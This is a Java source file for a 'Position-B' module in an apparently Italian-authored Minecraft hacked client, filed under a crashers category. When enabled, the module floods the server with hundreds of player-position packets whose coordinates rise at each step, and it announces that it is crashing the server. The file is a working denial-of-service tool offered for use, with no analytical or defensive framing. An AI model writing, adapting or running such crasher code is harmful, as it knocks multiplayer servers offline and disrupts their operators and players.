package it.thatskai.aragosta.module.crasher;

import it.thatskai.aragosta.AragostaMain;
import it.thatskai.aragosta.annotations.modules.IModule;
import it.thatskai.aragosta.annotations.modules.Module;
import it.thatskai.aragosta.module.Category;
import it.thatskai.aragosta.settings.Setting;
import it.thatskai.aragosta.utils.PacketsUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.network.play.client.C03PacketPlayer;

import static it.thatskai.aragosta.utils.MessageUtils.sendMessage;

@IModule(
        name = "Position-B",
        key = 0,
        category = Category.CRASHERS
)
public class PositionBModule extends Module {

    public void setup(){
        AragostaMain.instance.settingsManager.rSetting(new Setting(getName(), this, 430, 40, 1000, true));
    }
    int index;
    public void onEnable() {
        int packets = (int) AragostaMain.instance.settingsManager.getSettingByName(getName()).getValDouble();
        sendMessage("Mandando " + packets + " pacchetti con il metodo "+getName(), true);
        Minecraft mc = Minecraft.getMinecraft();
        double x = mc.thePlayer.posX;
        double y = mc.thePlayer.posY;
        double z = mc.thePlayer.posZ;
        for (int j = 0; j < packets; j++) {
            PacketsUtils.sendPacket(new C03PacketPlayer.C04PacketPlayerPosition(x++, y >= 255 ? 255 : y++, z++, true));
        }
        sendMessage("&7Crashing..", false);
        toggle();
    }
}
